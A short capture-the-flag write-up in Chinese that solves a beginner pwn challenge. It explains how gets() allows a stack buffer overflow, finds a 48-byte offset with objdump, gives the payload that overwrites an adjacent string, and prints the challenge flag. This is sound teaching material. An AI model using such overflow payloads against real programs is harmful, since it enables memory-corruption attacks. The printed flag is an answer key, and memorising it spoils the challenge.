# Two words, One problem

## 題目描述

The first time pwn solves problems.

```text
nc 1xgu8bd1niap.boroctf.com 34069
```

## 解題思路

1. **第一步**：

    先看題目給的兩個字串，並且 buffer 長度一樣。

    ```c
    char non_constant[BUFFSIZE] = "I love";
    const char constant[BUFFSIZE] = "barackCTF";
    ```

    並且因為題目用 gets()，所以可以直接 overflow。

    ```c
    void change(char *nc) {
        printf("What would like to write?\n> ");
        gets(nc);
        return;
    }
    ```

    在底下的 if 可以看到，如果 constant 是 boroCTF 才能拿到 flag。

    ```c
    printf("%s %s!\n", nc, c);
    if (strcmp(c, "boroCTF") == 0) {
        ...
        printf("%s\n", flag);
    }
    ```

    所以可以利用 buffer overflow 想辦法改 constant。

2. **第二步**：

    先找兩個字串的 offset：

    ```bash
    objdump -d -M intel ./chal | grep -A120 "<main>:"
    ```

    結果：

    ```text
    1311:	48 8d 55 a0          	lea    rdx,[rbp-0x60]
    1315:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
    ```

    距離為：

    ```text
    0x90 - 0x60 = 0x30 = 48
    ```

    所以 payload 就是：

    ```text
    b"A" * 48 + b"boroCTF"
    ```

3. **第三步**：

    先輸入 2，write value，然後輸入 payload，然後再輸入 1 讀 flag 即可。

    ```text
    2
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAboroCTF
    1
    ```

## Flag

```text
boroCTF{I_c@n_7ix_tH%s}
```
